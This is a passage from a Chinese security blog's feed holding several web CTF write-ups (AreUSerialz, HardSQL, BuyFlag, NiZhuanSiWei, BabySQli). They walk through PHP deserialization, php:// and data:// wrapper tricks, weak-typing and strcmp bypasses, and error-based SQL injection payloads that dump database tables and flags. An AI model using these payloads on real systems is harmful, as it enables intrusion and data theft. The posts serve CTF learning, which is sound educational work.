class="heading-link"><i class="fas fa-link"></i></a>3.1.3 绕过is_valid()</h4>      <p>$op,$filename,$content三个变量权限都是protected，而protected权限的变量在序列化的时会有%00*%00字符，%00字符的ASCII码为0，就无法通过上面的is_valid函数校验，对于PHP版本7.1+，对属性的类型不敏感，我们可以将protected类型改为public，以消除不可打印字符</p>        <h3 id="3-2-构建">          <a href="#3-2-构建" class="heading-link"><i class="fas fa-link"></i></a>3.2 构建</h3>      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//include(&quot;flag.php&quot;);</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $op = <span class="number">2</span>;</span><br><span class="line">    <span class="comment">//public $filename = &quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;</span></span><br><span class="line">    <span class="keyword">public</span> $filename=<span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $content;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> FileHandler();</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure><p><img src="/2020/11/16/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-AreUSerialz/2.2.1.png"></p><p>payload绕过：</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?str&#x3D;O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:57:&quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php&quot;;s:7:&quot;content&quot;;N;&#125;</span><br></pre></td></tr></table></div></figure><p><img src="/2020/11/16/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-AreUSerialz/2.2.2.png"></p><p>base64解码</p><p><img src="/2020/11/16/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-AreUSerialz/2.2.3.png"></p><p>或者上面的filename不用php://filter伪协议进行读取，直接flag.php</p><p>然后序列化出来的进行绕过，网页F12查看源码</p><p><img src="/2020/11/16/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-AreUSerialz/2.2.4.png"></p>]]></content>
      
      
      <categories>
          
          <category> Web-CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> PHP伪协议 </tag>
            
            <tag> 文件包含 </tag>
            
            <tag> PHP反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[极客大挑战 2019]HardSQL</title>
      <link href="2020/11/16/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-HardSQL/"/>
      <url>2020/11/16/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-HardSQL/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>        <h2 id="1-首页">          <a href="#1-首页" class="heading-link"><i class="fas fa-link"></i></a>1. 首页</h2>      <p><img src="/2020/11/16/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-HardSQL/0.1.png"></p><a id="more"></a><p>老样子，先尝试万能头，但是显示报错：<br><img src="/2020/11/16/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-HardSQL/0.2.png"></p><p>猜测有关键词被过滤了</p><p>经过手工测试过滤了and、= ,空格, union等多个sql关键字</p><p>利用burp抓包，使用updatexml或者extractvalue报错法注入,使用^异或符号替换and</p><p>空格和=号没有，所以我们要使用（）来代替空格，使用like来代替=号</p>        <h2 id="2-查询数据库：">          <a href="#2-查询数据库：" class="heading-link"><i class="fas fa-link"></i></a>2. 查询数据库：</h2>      <p>payload:</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#39;^extractvalue(1,concat(0x7e,(select(database()))))%23</span><br><span class="line">或者：</span><br><span class="line">&#39;^updatexml(1,concat(0x7e,(select(database()))),1)%23</span><br></pre></td></tr></table></div></figure><p><img src="/2020/11/16/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-HardSQL/1.png"></p><p>结果为：geek</p>        <h2 id="3-查询数据表">          <a href="#3-查询数据表" class="heading-link"><i class="fas fa-link"></i></a>3. 查询数据表</h2>      <p>payload：</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#39;^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(&#39;geek&#39;))))%23</span><br><span class="line">或者：</span><br><span class="line">&#39;^updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(&#39;geek&#39;))),1)%23</span><br></pre></td></tr></table></div></figure><p><img src="/2020/11/16/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-HardSQL/2.png"></p><p>结果为：H4rDsq1</p>        <h2 id="4-查询字段">          <a href="#4-查询字段" class="heading-link"><i class="fas fa-link"></i></a>4. 查询字段</h2>      <p>payload：</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#39;^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#39;H4rDsq1&#39;))))%23</span><br><span class="line">或者：</span><br><span class="line">&#39;^updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#39;H4rDsq1&#39;))),1)%23</span><br></pre></td></tr></table></div></figure><p><img src="/2020/11/16/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-HardSQL/3.png"></p><p>结果：id,username,password</p>        <h2 id="5-查询字段内容">          <a href="#5-查询字段内容" class="heading-link"><i class="fas fa-link"></i></a>5. 查询字段内容</h2>      <p>payload：</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#39;^extractvalue(1,concat(0x7e,(select(group_concat(username,password))from(H4rDsq1))))%23</span><br><span class="line">或者：</span><br><span class="line">&#39;^updatexml(1,concat(0x7e,(select(group_concat(username,password))from(H4rDsq1))),1)%23</span><br></pre></td></tr></table></div></figure><p><img src="/2020/11/16/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-HardSQL/4.1.png"></p><p>得到：flagflag{a2f129eb-de75-41f2-922</p><p>很明显，这个flag不完整，猜想是输出限制了长度</p><p>修改payload：</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#39;^extractvalue(1,concat(0x7e,(select(group_concat(left(password,30)))from(H4rDsq1))))%23</span><br><span class="line">然后：</span><br><span class="line">&#39;^extractvalue(1,concat(0x7e,(select(group_concat(right(password,30)))from(H4rDsq1))))%23</span><br><span class="line">先输出左边的30个字符串，然后再输出右边的字符串</span><br></pre></td></tr></table></div></figure><p>或者：</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#39;^updatexml(1,concat(0x7e,(select(group_concat(left(password,30)))from(H4rDsq1))),1)%23</span><br><span class="line">然后：</span><br><span class="line">&#39;^updatexml(1,concat(0x7e,(select(group_concat(right(password,30)))from(H4rDsq1))),1)%23</span><br></pre></td></tr></table></div></figure><p><img src="/2020/11/16/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-HardSQL/4.2.png"></p><p><img src="/2020/11/16/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-HardSQL/4.3.png"></p><p>分别得到的结果：</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;a2f129eb-de75-41f2-9223-a</span><br><span class="line">b-de75-41f2-9223-a9005e4912e0&#125;</span><br><span class="line">拼接为：flag&#123;a2f129eb-de75-41f2-9223-a9005e4912e0&#125;</span><br></pre></td></tr></table></div></figure>]]></content>
      
      
      <categories>
          
          <category> Web-CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[极客大挑战 2019]BuyFlag</title>
      <link href="2020/11/16/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag/"/>
      <url>2020/11/16/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>        <h2 id="极客大挑战-2019-BuyFlag">          <a href="#极客大挑战-2019-BuyFlag" class="heading-link"><i class="fas fa-link"></i></a>[极客大挑战 2019]BuyFlag</h2>      <p>这题是要求buy flag，同时在首页面也显示要是student，而且要输入correct password</p><p>F12查看源代码</p><a id="more"></a><p><img src="/2020/11/16/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag/1.png"></p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">~~~post money and password~~~</span><br><span class="line">if (isset($_POST[&#39;password&#39;])) &#123;</span><br><span class="line">$password &#x3D; $_POST[&#39;password&#39;];</span><br><span class="line">if (is_numeric($password)) &#123;</span><br><span class="line">echo &quot;password can&#39;t be number&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">&#125;elseif ($password &#x3D;&#x3D; 404) &#123;</span><br><span class="line">echo &quot;Password Right!&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br><span class="line">意思是psot上传参数money和password参数，同时password要是404，还不能为数字</span><br></pre></td></tr></table></div></figure><p>is_numeric()函数：</p><p><img src="/2020/11/16/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag/2.png"></p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">所以可以利用弱类型，即让password&#x3D;404a，</span><br><span class="line">或者404%0a</span><br><span class="line">is_numeric() 判断变量是否为数字或数字字符串，不仅检查10进制，16进制也可以。</span><br><span class="line">is_numeric函数对于空字符%00，无论是%00放在前后都可以判断为非数值，而%20空格字符只能放在数值后。所以，查看函数发现该函数对于第一个空格字符会跳过空格字符判断，接着后面的判断！</span><br><span class="line">该函数还可能造成sql注入，例如将‘1 or 1’转换为16进制形式，再传参，就可以造成sql注入</span><br></pre></td></tr></table></div></figure><p>利用burp抓包</p><p>向下翻看，可以注意到一条明显的语句</p><p><img src="/2020/11/16/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag/3.png"></p><p>这时就能联想到对user有一定的要求，可以看到cookie中user为0，改成1后看到变化</p><p><img src="/2020/11/16/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag/4.png"></p><p>这题有点问题，按理说应该post上传参数，但是可以看出从抓包一开始的就是get方式，不知道是怎么回事，所以只能网上盗图了</p><p>上传password参数：</p><p><img src="/2020/11/16/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag/5.png"></p><p>上传money参数：</p><p><img src="/2020/11/16/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag/6.png"></p><p>显示长度太长了，</p><p><strong>方法一：</strong></p><p>strcmp()绕过，直接money[]=1就可以了</p><p><img src="/2020/11/16/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag/7.png"></p><p>strcmp()绕过原理：</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">int strcmp ( string $str1 , string $str2 )</span><br><span class="line">参数 str1第一个字符串。str2第二个字符串。如果str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。</span><br><span class="line"></span><br><span class="line">可知，传入的期望类型是字符串类型的数据，但是如果我们传入非字符串类型的数据的时候，这个函数将会有怎么样的行为呢？实际上，当这个函数接受到了不符合的类型，这个函数将发生错误，但是在5.3之前的php中，显示了报错的警告信息后，将return 0 。</span><br><span class="line">也就是虽然报了错，但却判定其相等</span><br></pre></td></tr></table></div></figure><p><strong>方法二：</strong></p><p>利用科学计数法：money=1e10</p><p><img src="/2020/11/16/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag/8.png"></p>]]></content>
      
      
      <categories>
          
          <category> Web-CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> PHP </tag>
            
            <tag> Buy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[ZJCTF 2019]NiZhuanSiWei</title>
      <link href="2020/11/16/ZJCTF-2019-NiZhuanSiWei/"/>
      <url>2020/11/16/ZJCTF-2019-NiZhuanSiWei/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>        <h2 id="1-首页">          <a href="#1-首页" class="heading-link"><i class="fas fa-link"></i></a>1. 首页</h2>      <p><img src="/2020/11/16/ZJCTF-2019-NiZhuanSiWei/0.png"></p><a id="more"></a><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$text = $_GET[<span class="string">&quot;text&quot;</span>];</span><br><span class="line">$file = $_GET[<span class="string">&quot;file&quot;</span>];</span><br><span class="line">$password = $_GET[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the zjctf&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents($text,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/&quot;</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Not now!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($file);  <span class="comment">//useless.php</span></span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        <span class="keyword">echo</span> $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>        <h2 id="2-file-get-content-函数和data协议">          <a href="#2-file-get-content-函数和data协议" class="heading-link"><i class="fas fa-link"></i></a>2. file_get_content()函数和data协议</h2>      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents($text,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the zjctf&quot;</span></span><br></pre></td></tr></table></div></figure><p>这一行代码进行一个绕过。因为我们不知道后台哪个文件的源码是<code>welcome to the zjctf</code>，说不准就真没有，只能在传入的时候直接带进来。这里利用到<code>data伪协议</code>将数据直接写进去，以供<code>file_get_contents</code>函数读取。</p><p>这里可以使用php的data协议，即可绕过</p><p>payload1:</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,welcome to the zjctf</span><br><span class="line">如果要进行编码绕过：</span><br><span class="line">text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;</span><br></pre></td></tr></table></div></figure><p>data伪协议讲解：<span class="exturl"><a class="exturl__link" href="https://www.php.net/manual/zh/wrappers.data.php">https://www.php.net/manual/zh/wrappers.data.php</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>        <h2 id="3-include-file-文件包含">          <a href="#3-include-file-文件包含" class="heading-link"><i class="fas fa-link"></i></a>3. include($file)文件包含</h2>      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/&quot;</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Not now!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($file);  <span class="comment">//useless.php</span></span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        <span class="keyword">echo</span> $password;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></div></figure><p>这里源码给你提示了，让你包含<code>useless.php</code>，如果包含<code>flag.php</code>直接报错。<br>于是，</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=useless.php</span><br></pre></td></tr></table></div></figure><p>如果直接这么执行的话，返回的文件中包含的php代码会直接当成php命令来执行，所以需要base64编码一下，以免被执行，</p><p>payload3：</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;useless.php</span><br></pre></td></tr></table></div></figure><p>这里利用<code>php&quot;//filter</code>来读取源码:</p><p>payload1+payload2得到的payload为：</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;useless.php</span><br></pre></td></tr></table></div></figure><p>得到页面：<br><img src="/2020/11/16/ZJCTF-2019-NiZhuanSiWei/2.1.png"></p><p>网页中的base64解码：</p><p><img src="/2020/11/16/ZJCTF-2019-NiZhuanSiWei/2.2.png"></p><p>得到源码：</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> $file;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></div></figure>        <h2 id="4-序列化构造">          <a href="#4-序列化构造" class="heading-link"><i class="fas fa-link"></i></a>4. 序列化构造</h2>      <p>我们发现useless.php是一个类，并且提示我们flag在flag.php，明确了文件位置就可以开始构造pop链。</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> $file;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">$demo = <span class="keyword">new</span> Flag();</span><br><span class="line">$u = serialize($demo);</span><br><span class="line"><span class="keyword">echo</span> $u;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure><p><img src="/2020/11/16/ZJCTF-2019-NiZhuanSiWei/3.1.png"></p><p><img src="/2020/11/16/ZJCTF-2019-NiZhuanSiWei/3.2.png"></p><p>payload3：</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></div></figure><p>构造成总的payload：</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;&amp;file&#x3D;useless.php&amp;password&#x3D;O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></div></figure><p><img src="/2020/11/16/ZJCTF-2019-NiZhuanSiWei/3.3.png"></p>]]></content>
      
      
      <categories>
          
          <category> Web-CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> PHP伪协议 </tag>
            
            <tag> 文件包含 </tag>
            
            <tag> PHP反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[GXYCTF2019]BabySQli</title>
      <link href="2020/11/16/GXYCTF2019-BabySQli/"/>
      <url>2020/11/16/GXYCTF2019-BabySQli/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>        <h2 id="GXYCTF2019-BabySQli">          <a href="#GXYCTF2019-BabySQli" class="heading-link"><i class="fas fa-link"></i></a>[GXYCTF2019]BabySQli</h2>      <p>SQL注入题目：</p><p>首页面输入payload：</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">11&#39;</span><br></pre></td></tr></table></div></figure><a id="more"></a><p><img src="/2020/11/16/GXYCTF2019-BabySQli/0.1.png"></p><p>报错：</p><p><img src="/2020/11/16/GXYCTF2019-BabySQli/0.2.png"></p><p>输入有注入点</p><p>利用burp抓包测试：</p><p>尝试注入：</p><p>payload：</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;or 1&#x3D;1%23</span><br></pre></td></tr></table></div></figure><p><img src="/2020/11/16/GXYCTF2019-BabySQli/0.3.png"></p><p>错误用户，试着用admin权限，修改注入位置，检测到注入，说明有过滤</p><p><img src="/2020/11/16/GXYCTF2019-BabySQli/0.4.png"></p><p>显示错误密码，</p><p>但是注意到响应包中有部分奇怪编码，类似base64</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5</span><br></pre></td></tr></table></div></figure>        <h2 id="1-base32与base64">          <a href="#1-base32与base64" class="heading-link"><i class="fas fa-link"></i></a>1. base32与base64</h2>      <p>先说说base32 和 base64 的区别，<br>base32 只有大写字母和数字数字组成，或者后面有三个等号。<br>base64 只有大写字母和数字，小写字母组成，后面一般是两个等号。<br>明显，那段文字是base32加密<br>解密后：</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw&#x3D;&#x3D;</span><br></pre></td></tr></table></div></figure><p>继续base64解密:</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where username &#x3D; &#39;$name&#39;</span><br></pre></td></tr></table></div></figure>        <h2 id="2-判断字段个数">          <a href="#2-判断字段个数" class="heading-link"><i class="fas fa-link"></i></a>2. 判断字段个数</h2>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">or被过滤了，尝试大写绕过</span><br><span class="line">&#39;Order by 1&#x2F;2&#x2F;3&#x2F;4... %23    #4的时候显示长度有问题，所以字段长度为3</span><br><span class="line">或者union联合查询：</span><br><span class="line">&#39;union select 